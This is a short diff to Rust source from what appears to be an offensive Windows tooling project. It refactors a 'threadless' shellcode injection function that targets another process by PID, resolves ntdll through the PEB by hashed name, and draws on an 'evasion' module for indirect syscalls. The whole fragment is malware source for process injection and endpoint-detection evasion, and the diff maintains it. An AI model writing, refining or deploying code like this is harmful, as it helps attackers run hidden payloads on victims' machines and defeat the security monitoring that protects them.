@@ -21,7 +21,7 @@ struct TlClientId {
 
 #[cfg(target_os = "windows")]
 pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
-    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
     use crate::resolve::api_hash::h;
     use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
 
@@ -99,10 +99,7 @@ pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
 
     // Resolve threadless injection stubs from ntdll via PEB + hash
     #[cfg(target_arch = "x86_64")]
-    let ntdll = {
-        const NTDLL_H: u32 = djb2_hash_lower(b"ntdll.dll");
-        peb_get_module_base(NTDLL_H)
-    };
+    let ntdll = { peb_get_module_base(h::DLL_NTDLL) };
     #[cfg(not(target_arch = "x86_64"))]
     let ntdll = {
         windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8
